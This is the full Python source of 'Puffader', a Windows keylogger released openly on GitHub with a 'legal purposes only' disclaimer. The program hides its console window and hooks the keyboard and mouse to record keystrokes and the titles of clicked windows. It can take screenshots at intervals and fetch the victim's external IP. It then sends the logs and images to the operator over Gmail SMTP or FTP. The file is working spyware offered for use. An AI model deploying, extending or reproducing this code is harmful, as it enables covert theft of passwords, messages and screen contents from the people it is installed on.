'''
Puffader Windows Keylogger by xp4xbox
https://github.com/xp4xbox/Puffader

Copyright (c) 2017 xp4xbox
MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE

NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
'''

import smtplib, time, os, threading, sys, subprocess, argparse
import win32console, win32gui, win32event, win32api, winerror
from sys import exit; from ftplib import FTP; from urllib2 import urlopen
from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage
try:
    import pythoncom, pyHook, pyautogui
    from pyHook import GetKeyState, HookConstants
except ImportError:
    print("required pyhook, pywin32 and pyautogui")
    exit()

strEmailAc = "email@gmail.com"
strEmailPass = "pass"

blnFTP = "False"  # if using ftp set this to True and configure the options below
strFtpServer = ""
intFtpPort = 21
strFtpUser = ""
strFtpPass = ""
strFtpRemotePath = "/"

intCharPerSend = 1000  # set num of chars before send log/store

blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
intTimePerSend = 120  # set how often to send/save logs in seconds

blnStoreLocal = "False"  # True to save logs/screens locally
strLogFile = ""  # set non-protected path to text file eg. c:/temp/test.txt

blnLogClick = "False"  # for logging window clicks
blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace

blnScrShot = "False"  # set to True for capturing screenshots
strScrDir = ""  # set non-protected dir for scrshot location if storing locally. eg c:/temp
intScrTime = 120  # set time for taking screen in seconds


def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True
# hide window as new thread. Necessary in order to define timer used later
objTimer = threading.Timer(0, hide);objTimer.start()

objParser = argparse.ArgumentParser()  # set up arg parser
objParser.add_argument("-o", "--open", default=None)  # add args
args = objParser.parse_args()

# open file in notepad if argument is given
if args.open:
    OpenNotepad = subprocess.Popen([os.environ["windir"]+"\\notepad.exe", args.open])


# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit()


def GetExIp(): # function to get external ip
    global strExIP
    try:
        strExIP = urlopen("http://ident.me").read().decode('utf8')
    except:
        strExIP = "?"
# obj defined for later use for screenshot timer
objTimer2 = threading.Timer(0, GetExIp); objTimer2.start()

blnFirstSend = "True"
blnStop = "False"
intLogChars = 0


def OnKeyboardEvent(event):
    global strLogs, objTimer, intLogChars, objTimer2
    try:  # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""

    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop, strExIP):
        global blnFirstSend  # easier to just define this variable to be global within the functions
        try:
            if blnStop == "True":
                strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
                strMessage = strDateTime + "\n\n" + strLogs
            elif blnFirstSend == "True":
                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
                strMessage = strDateTime + "\n\n" + strLogs
                blnFirstSend = "False"
            else:
                strMessage = strLogs

            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From "+strExIP, strMessage)

            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            SmtpServer.ehlo()   # identifies you to the smtp server
            SmtpServer.login(strEmailAc, strEmailPass)
            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
            SmtpServer.close()
        except:
            os._exit(1)  # if for some reason, the email cannot send, exit program including threads.

    def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop):
        global blnFirstSend
        try:
            ftp = FTP(); ftp.connect(strFtpServer, 21)
            ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
            # connect to ftp server

            TMP = os.environ["TEMP"]
            objLogFile = open(TMP + "/log.txt", 'w')
            if blnStop == "True":
                objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
            elif blnFirstSend == "True":
                objLogFile.write("\n" +"Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
                blnFirstSend = "False"
            objLogFile.write(strLogs)
            objLogFile.close()
            # create log file

            arFileList = ftp.nlst()
            if "log.txt" in arFileList:
                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("APPE log.txt", objLogFile)
            else:
                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("STOR log.txt", objLogFile)
            objLogFile.close(); ftp.close()
            objLogFile = open(TMP + "/log.txt", 'w'); objLogFile.close()  # delete log file contents
        except:
            os._exit(1)

    def StoreMessagesLocal(strLogs, blnStop):
        global blnFirstSend
        # log keys locally
        if os.path.isfile(strLogFile):
            objLogFile = open(strLogFile, 'a')
        else:
            objLogFile = open(strLogFile, 'w')
        if blnStop == "True":
            objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
        elif blnFirstSend == "True":
            objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
            blnFirstSend = "False"
        objLogFile.write(strLogs)
        objLogFile.close()

    def CreateNewThreadMessages():  # function for creating thread for sending messages
        if not strLogs == "":
            if blnStoreLocal == "True":
                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=(strLogs, blnStop))
                StoreLogThread.start()
            elif blnFTP == "True":
                SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
                SendFTPThread.start()
            else:
                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop, strExIP))
                SendMailThread.start()

    def SendScreen():  # function to send screens (easier to do this as a new function)
        if blnFTP == "True":
            try:
                ftp = FTP(); ftp.connect(strFtpServer, 21)
                ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
                objScrFile = open(strScrPath, "rb")
                ftp.storbinary("STOR " + strScrPath.split("/")[1], objScrFile)  # copy image to ftp
                objScrFile.close(); ftp.close()
            except:
                pass  # pass to try again later
        else:
            try:
                objMsg = MIMEMultipart()
                objMsg["Subject"] = "New Screenshot From " + strExIP
                img = MIMEImage(file(strScrPath, "rb").read())
                # attach image as original file name
                img.add_header("Content-Disposition", "attachment; filename= %s" % strScrPath.split("/")[1])
                objMsg.attach(img)
                SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465); SmtpServer.ehlo()
                SmtpServer.login(strEmailAc, strEmailPass)
                SmtpServer.sendmail(strEmailAc, strEmailAc, objMsg.as_string())
                SmtpServer.close()
            except:
                pass
        os.remove(strScrPath)  # delete file after sending

    def TakeScr():  # function to take screenshot
        if blnStoreLocal == "True":
            threading.Thread(pyautogui.screenshot().save(time.strftime(strScrDir + "/%Y%m%d%H%M%S" + ".png"))).start()
        else:
            global strScrPath
            TMP = os.environ["TEMP"]
            strScrPath = time.strftime(TMP + "/%Y%m%d%H%M%S" + ".png")  # save screenshot with datetime format
            threading.Thread(pyautogui.screenshot().save(strScrPath)).start()
            SendScreenThread = threading.Thread(target=SendScreen)
            SendScreenThread.start()

    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
        # CTRL-RIGHT_SHIFT-H to stop the program
        if blnStoreLocal == "True":
            StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=(strLogs, "True"))
            StoreLogThread.start()
        elif blnFTP == "True":
            SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, "True"))
            SendFTPThread.start()
        else:
            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True", strExIP))
            SendMailThread.start()
        exit()

    if event.Ascii == 8:
        if blnBackRemove == "True":
            if not strLogs == "":
                if intLogChars > 0:
                    strLogs = strLogs[0:len(strLogs) - 1]
        else:
            strLogs = strLogs + " [BckSpace] "
    elif event.Ascii == 9:
        strLogs = strLogs + " [Tab] "
    elif event.Ascii == 0:  # if the key is a special key such as alt, win, etc. Pass
        pass
    else:
        intLogChars += 1
        strLogs = strLogs + chr(event.Ascii)

    if blnUseTime == "True":  # if the user is sending messages by timer
        if not objTimer.is_alive():  # check to see if the timer is not active
            objTimer = threading.Timer(intTimePerSend, CreateNewThreadMessages)
            objTimer.start()
            strLogs = ""; intLogChars = 0
    else:
        if intLogChars >= intCharPerSend:  # send/save message if log is certain length
            CreateNewThreadMessages()
            strLogs = ""; intLogChars = 0

    if blnScrShot == "True":  # if the user is capturing screenshots
        if not objTimer2.is_alive():
            objTimer2 = threading.Timer(intScrTime, TakeScr)
            objTimer2.start()
    return True  # return True to pass key to windows


def OnMouseEvent(event):  # when the mouse is clicked
    global strLogs
    try:
        strLogs
    except NameError:
        strLogs = ""

    if not str(event.WindowName) == "None":  # log window name and time
        strLogs = strLogs + "\n" + "["+time.ctime().split(" ")[3] + "] " + event.WindowName + "\n" + "====================" + "\n"
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
if blnLogClick == "True":
    hooks_manager.MouseLeftDown = OnMouseEvent
    hooks_manager.HookMouse()
pythoncom.PumpMessages()
